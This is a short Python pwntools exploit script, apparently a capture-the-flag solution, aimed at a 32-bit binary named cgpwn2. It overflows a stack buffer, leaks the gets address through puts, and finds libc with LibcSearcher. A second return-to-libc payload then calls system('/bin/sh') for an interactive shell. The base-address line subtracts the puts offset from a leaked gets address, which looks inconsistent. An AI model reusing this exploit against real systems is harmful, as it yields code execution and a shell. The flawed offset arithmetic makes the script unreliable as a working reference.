from pwn import *
from LibcSearcher import *
context(arch='i386',os='linux',log_level='debug')
io=process('./cgpwn2')
elf=ELF('./cgpwn2')
ret=0x080483aa 
gets_got=elf.got['gets']
puts_plt=elf.plt['puts']
main_addr=elf.sym['main']
payload1='a'*0x26+p32(ret)+p32(puts_plt)+p32(main_addr)+p32(gets_got)
io.recvuntil('please tell me your name')
io.sendline('Sakura')
io.recvuntil('hello,you can leave some message here:')
io.sendline(payload1)
gets_addr=u32(io.recv(4))
#puts_addr=0x0804A018
io.recvuntil('please tell me your name')
io.sendline('Sakura')
io.recvuntil('hello,you can leave some message here:')
libc=LibcSearcher('gets',gets_addr)
base_addr=gets_addr-libc.dump('puts')
system=base_addr+libc.dump('system')
binsh=base_addr+libc.dump('str_bin_sh')
payload2='a'*0x26+p32(ret)+p32(system)+p32(0)+p32(binsh)
io.sendline(payload2)
io.interactive()
